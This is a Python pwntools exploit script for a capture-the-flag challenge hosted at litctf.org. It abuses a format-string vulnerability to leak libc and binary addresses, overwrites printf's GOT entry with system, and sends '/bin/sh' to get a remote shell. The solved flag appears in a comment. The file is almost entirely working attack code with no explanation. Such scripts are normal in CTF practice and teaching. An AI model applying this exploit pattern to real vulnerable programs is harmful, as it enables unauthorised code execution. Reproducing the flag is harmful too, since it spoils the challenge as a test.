#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./main_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

REMOTE_NC_CMD    = "nc litctf.org 31772"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b printf
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"%3$p|%33$p")
    r.recvline()
    leaks = r.recvline(False).split(b"|")
    libc.address = int(leaks[0], 16) - libc.sym.read-18
    exe.address = int(leaks[1],16) - exe.sym.__libc_csu_init-77

    r.sendline(fmtstr_payload(6, {exe.got.printf:libc.sym.system}))
    r.sendline(b"/bin/sh")

    r.interactive()
    #LITCTF{1_GOT_th3_b3s7_FORMATTING_5k1ll5_5c52325d}

if __name__ == "__main__":
    main()